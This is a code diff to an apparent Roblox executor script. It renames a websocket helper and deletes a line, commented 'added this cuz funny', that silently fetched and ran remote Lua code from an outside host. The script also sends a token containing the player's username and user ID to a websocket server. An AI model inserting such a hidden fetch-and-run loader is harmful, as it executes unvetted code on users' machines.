@@ -1972,6 +1972,7 @@ httprequest = (syn and syn.request) or (http and http.request) or http_request o
 PlaceId, JobId = game.PlaceId, game.JobId
 local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, UserInputService:GetPlatform())
 everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+everyWebsocket = (syn and syn.websocket and syn.websocket.connect) or (WebSocket and WebSocket.connect)
 
 local isChatLegacy = (TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService)
 local chatRemote = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
@@ -6437,22 +6438,19 @@ local randomNumber = Random.new():NextInteger(100000000, 999999999)
 local token = string.format("%s-%d-%s-%d", username, userId, randomString, randomNumber)
 local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 
-if everyClipboard and everywebsocket then else warn("Unsupported executor"); return end
+if everyClipboard and everyWebsocket then else warn("Unsupported executor"); return end
 
         everyClipboard(token)
 
         notify("Generated token: " .. token)
 
         pcall(function()
-	    _G.ws = everywebsocket.connect(url)
+	    _G.ws = everyWebsocket.connect(url)
         end)
 
         local ws = _G.ws
         if ws then
             notify("Connected to WebSocket server")
-
-            -- added this cuz funny
-	        loadstring(game:HttpGet("https://storage.iyr.lol/other-stuff/changeexecutoridentiyfr.lua"))()
 
             ws:Send(token)
 
